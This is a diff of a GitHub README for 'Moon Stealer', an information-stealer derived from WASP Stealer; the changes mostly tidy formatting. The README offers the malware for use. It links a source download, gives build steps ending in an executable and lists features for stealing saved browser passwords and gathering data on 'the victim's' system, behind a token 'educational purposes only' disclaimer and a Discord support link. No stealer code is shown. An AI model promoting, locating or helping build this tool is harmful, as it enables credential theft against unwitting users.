@@ -4,17 +4,13 @@
 <h1 align="center">
  
 ### Based on WASP Stealer.
-##credit ton them##
 
 ### Requirements:
--**be cool** 
 - **Few braincells**
 - **Windows 10 / 11**
 - **Python:** [v3.10](https://www.python.org/downloads/release/python-3100/)
  
-### how to set up ##
-
-------------------------------------------------------------------------------------------------
+### Setup
 
 1. [Download source code zip](https://github.com/Yuvi5001/moon-stealer/archive/refs/heads/main.zip)
 
@@ -33,22 +29,11 @@
 8. check ur dist folder for your executable
 
 
-
 <a id="features"></a>
 
--------------------------------------------------------------------------------------------------
+---
 
-### tos ##
-
-the right to the program to (yuvi#0930)
-
-all copyright gose to (yuvi#0930)
-
-we do not agree with useing it without perms
-
-------------------------------------------------------------------------------------------------
-
-### Features ##
+### Features
 
 - Browser Stealer
     - Steal Saved Passwords
@@ -81,30 +66,24 @@ we do not agree with useing it without perms
 
 - Extras
     - Gets information of the victim's system
-------------------------------------------------------------------------------------------------    
-## Screenshots ##
+    
+## Screenshots
 
 <img src="https://media.discordapp.net/attachments/1072325721130799206/1072630431012368426/My_project-1.png" width="444"></img>
-
 <img src="https://media.discordapp.net/attachments/1071893829218746409/1072633366354071703/My_project-1_1.png" width="444"></img>
-
 <img src="https://media.discordapp.net/attachments/1071893829218746409/1072634930472947723/Screenshot_2023-02-07_4.47.43_PM.png" width="444"></img>
 
 
-## Important ##
+## Important
  
 I am not responsible for any damage this software may cause; This program was made for educational purposes only.
 
-## License ##
+## License
 
 Moon Stealer is licensed under the <a href="https://mit-license.org/">MIT License</a>.
 
-## Errors? ##
-
+## Errors?
 - Make an [issue](https://github.com/Yuvi5001/moon-stealer/issues)
 - Join the [Discord](https://discord.gg/fnNd26Depz)
-- dont spam ping
--join up and ask around 
 
-{Credits: WASP Stealer}
-
+Credits: WASP Stealer
